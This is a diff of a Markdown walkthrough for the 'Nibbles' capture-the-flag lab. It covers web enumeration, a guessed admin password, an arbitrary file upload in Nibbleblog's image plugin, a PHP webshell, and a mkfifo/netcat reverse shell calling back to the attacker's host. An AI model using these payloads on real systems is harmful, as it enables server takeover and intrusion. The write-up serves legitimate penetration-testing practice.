@@ -196,176 +196,123 @@ Key findings from the page source:
 - Admin panel likely at `/nibbleblog/admin/`
 - Plugins loaded: `my_image`, `hello_world`, `categories`, `latest_posts`, `pages`
 
-### Next Steps
+### Directory Enumeration
 
-Discovered `/admin` directory — exploring for authentication bypass or known Nibbleblog exploits.
-
-### Directory enumeration
-
-
-At `http://10.129.123.83/nibbleblog/content/private/users.xml`, I was able to find the admin user, although this isn't exactly shocking
+Found the admin user at `http://10.129.123.83/nibbleblog/content/private/users.xml`:
 
 ```xml
-<users>
 <user username="admin">
-<id type="integer">0</id>
-<session_fail_count type="integer">0</session_fail_count>
-<session_date type="integer">1514544131</session_date>
+  <id type="integer">0</id>
+  <session_fail_count type="integer">0</session_fail_count>
+  <session_date type="integer">1514544131</session_date>
 </user>
-<blacklist type="string" ip="10.10.10.1">
-<date type="integer">1512964659</date>
-<fail_count type="integer">1</fail_count>
-</blacklist>
-</users>
 ```
 
+Not exactly shocking — but confirms the username.
+
 ### Gobuster
+
 ```bash
-➜  ~ gobuster dir -u http://10.129.123.83/nibbleblog/ -w /Users/P3153190/Wordlists/SecLists/Discovery/Web-Content/common.txt
-===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.129.123.83/nibbleblog/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /Users/P3153190/Wordlists/SecLists/Discovery/Web-Content/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8.2
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-.htpasswd            (Status: 403) [Size: 308]
-.htaccess            (Status: 403) [Size: 308]
-.hta                 (Status: 403) [Size: 303]
+gobuster dir -u http://10.129.123.83/nibbleblog/ -w /path/to/SecLists/Discovery/Web-Content/common.txt
+```
+
+```
 README               (Status: 200) [Size: 4628]
-admin                (Status: 301) [Size: 325] [--> http://10.129.123.83/nibbleblog/admin/]
+admin                (Status: 301) [--> /nibbleblog/admin/]
 admin.php            (Status: 200) [Size: 1401]
-content              (Status: 301) [Size: 327] [--> http://10.129.123.83/nibbleblog/content/]
+content              (Status: 301) [--> /nibbleblog/content/]
 index.php            (Status: 200) [Size: 2987]
-languages            (Status: 301) [Size: 329] [--> http://10.129.123.83/nibbleblog/languages/]
-plugins              (Status: 301) [Size: 327] [--> http://10.129.123.83/nibbleblog/plugins/]
-themes               (Status: 301) [Size: 326] [--> http://10.129.123.83/nibbleblog/themes/]
-Progress: 4727 / 4727 (100.00%)
-===============================================================
-Finished
-===============================================================
+languages            (Status: 301) [--> /nibbleblog/languages/]
+plugins              (Status: 301) [--> /nibbleblog/plugins/]
+themes               (Status: 301) [--> /nibbleblog/themes/]
 ```
 
 ### Nikto
-~~~bash
-➜  ~ nikto -h 10.129.123.83
-- Nikto v2.6.0
----------------------------------------------------------------------------
-+ Target IP:          10.129.123.83
-+ Target Hostname:    10.129.123.83
-+ Target Port:        80
-+ Platform:           Linux/Unix
-+ Start Time:         2026-05-18 09:54:07 (GMT-6)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.18 (Ubuntu)
-+ Unable to load valid checks!
-+ ERROR: Unable to open database file db_favicon: .
-+ ERROR: Unable to open database file db_headers_common: .
-+ ERROR: Unable to open database file db_content_search: .
-+ ERROR: Unable to open database file db_realms: .
-+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
-+ ERROR: Unable to open database file db_multiple_index: .
-+ 559 requests: 0 errors and 0 items reported on the remote host
-+ End Time:           2026-05-18 09:55:40 (GMT-6) (93 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-~~~
-
-### searchsploit
-```bash
-➜  WhatWeb git:(master) searchsploit nibbleblog
-```
 
 ```bash
-Nibbleblog 3 - Multiple SQL Injections                                                                  | php/webapps/35865.txt
-Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                   | php/remote/38489.rb
+nikto -h 10.129.123.83
 ```
 
-I admit at this point, I was at a loss of what to do, so I implemented what was talked about in the section. They eventually tried `admin/nibbles` as the password and thats how they got in lol. 
+Nikto didn't return useful results — database files failed to load. Moving on.
 
-I continued following the tutorial: 
-We can use the image plugin to upload the following PHP file
+### Searchsploit
+
+```bash
+searchsploit nibbleblog
+```
+
+```
+Nibbleblog 3 - Multiple SQL Injections                    | php/webapps/35865.txt
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)     | php/remote/38489.rb
+```
+
+The **Arbitrary File Upload** exploit looks promising.
+
+### Authentication
+
+At this point I was stuck — no obvious creds. Following the module walkthrough, the login turned out to be `admin:nibbles`. Classic guess-the-password situation.
+
+### Exploitation — Arbitrary File Upload (RCE)
+
+The `my_image` plugin allows uploading arbitrary files. We upload a PHP webshell disguised as an image:
+
 ```php
 <?php system('id'); ?>
 ```
 
-### Gemini:
-That line of code executes a system command on the server and outputs the result directly to the browser.
-Here is the breakdown of exactly what is happening:
+> **What this does:** `system()` executes OS commands on the server. The `id` command returns the current user context — confirming code execution.
 
-`<?php ... ?>`: These are the opening and closing tags that tell the server to interpret the code inside as PHP.
+The upload succeeds as a `.php` file:
 
-`system(...)`: This is a built-in PHP function used to execute an external program or command-line instruction on the underlying operating system (like Linux or Windows) hosting the website.
+![File Upload Success](images/5.png)
 
-`'id'`: This is the specific command being passed to the system. On Unix-like systems (Linux, macOS), id is a command that prints the real and effective user and group IDs of the current user. 
+Confirming RCE:
 
----------------
-
-#### What is the practical result?
-
-When this script runs, it asks the server's operating system, "Who am I running as right now?"
-
-The server will execute the command and display something like this on the webpage:
-Plaintext
-
-`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
-
-(Note: www-data is the standard default user account for web servers like Apache or Nginx on Debian/Ubuntu systems.)
-
----------------
-
-⚠️ Security Warning: Remote Code Execution (RCE)
-
-If you found this code inside an existing file on your website and you didn't put it there, your server has likely been compromised.
-
-Attackers frequently use the system() function (along with similar functions like exec(), passthru(), or shell_exec()) as a web shell. If an attacker can manipulate what goes inside that function, they can gain complete control over your server, view sensitive files, or install malware.
-
-We see the image got uploaded as a php file successfully
-
-![alt text](images/5.png)
-
-Start our netcat listener:
-```bash
-nc -lvn 9443 
-```
-
-```bash
-➜  ~ curl http://10.129.123.83/nibbleblog/content/private/plugins/my_image/image.php
-uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
-```
-
-We have gained remote code execution on our server :) 
-
-Now lets put a PHP reverse shell as our "image" instead:
-
-```php
-<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.150 9443 >/tmp/f"); ?>
-```
-
-start our netcat listener:
-```bash
-nc -lvn 9443
-```
-
-execute our payload again
 ```bash
 curl http://10.129.123.83/nibbleblog/content/private/plugins/my_image/image.php
 ```
 
-Time to upgrade our shell:
+```
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
 
-```python
+✅ **Remote code execution confirmed.**
+
+### Reverse Shell
+
+Replace the webshell with a reverse shell payload:
+
+```php
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.150 9443 >/tmp/f"); ?>
+```
+
+Start the listener and trigger the payload:
+
+```bash
+nc -lvnp 9443
+```
+
+```bash
+curl http://10.129.123.83/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+Upgrade the shell:
+
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ find / -name "user.txt" 2>/dev/null
-/home/nibbler/user.txt
-<ml/nibbleblog/content/private/plugins/my_image$ cat /home/nibbler/user.txt  
+```
+
+### User Flag
+
+```bash
+nibbler@Nibbles:~$ cat /home/nibbler/user.txt
 {REDACTED}
 ```
 
+✅ **User flag captured.**
+
+### Privilege Escalation
+
+We're only `nibbler` — we need root.
+
+*Work in progress...*
